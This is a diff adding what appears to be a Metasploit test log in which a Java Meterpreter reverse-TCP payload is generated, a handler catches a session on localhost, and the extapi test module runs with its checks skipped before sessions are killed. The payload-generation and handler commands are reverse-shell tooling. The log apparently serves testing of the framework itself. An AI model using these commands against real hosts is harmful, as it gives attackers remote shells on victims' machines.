@@ -1,0 +1,31 @@
+use java/meterpreter/reverse_tcp
+Stopping all jobs...
+[4mmsf6[0m post([1m[31mtest/unix[0m) [0m> irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20240125-1430-rv613ltxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> generate -o /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20240125-1430-9u5yaa.jar -f jar AutoVerifySessionTimeout=30 lport=6005 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_debug_log20240125-1430-m0xajotxt spawn=0
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> SessionTlvLogging => file:/var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/javameterpreterreverse_tcp_session_tlv_logging20240125-1430-rv613ltxt
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> [*] Writing 5259 bytes to /var/folders/24/8k48jl6d249_n_qfxwsl6xvm0000gn/T/child-process-rb-java-meterpreter-reverse-tcp20240125-1430-9u5yaa.jar...
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 4
+[4mmsf6[0m payload([1m[31mjava/meterpreter/reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6005 
+[*] Sending stage (57971 bytes) to 127.0.0.1
+[*] Meterpreter session 5 opened (127.0.0.1:6005 -> 127.0.0.1:49387) at 2024-01-25 19:35:35 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=5 AddEntropy=true Verbose=true
+[*] Loading extapi extension...
+[*] This module is only available in a windows meterpreter session.
+[*] Running against session 5
+[*] Session type is meterpreter and platform is osx
+[*] SKIPPED: def test_service_management (session platform is not windows)
+[*] SKIPPED: def test_desktop_windows_management (session platform is not windows)
+[*] SKIPPED: def test_clipboard_management (session platform is not windows)
+[*] Testing complete in 0.0 seconds
+[*] Passed: 3; Failed: 0; Skipped: 3
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 5 closed.
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
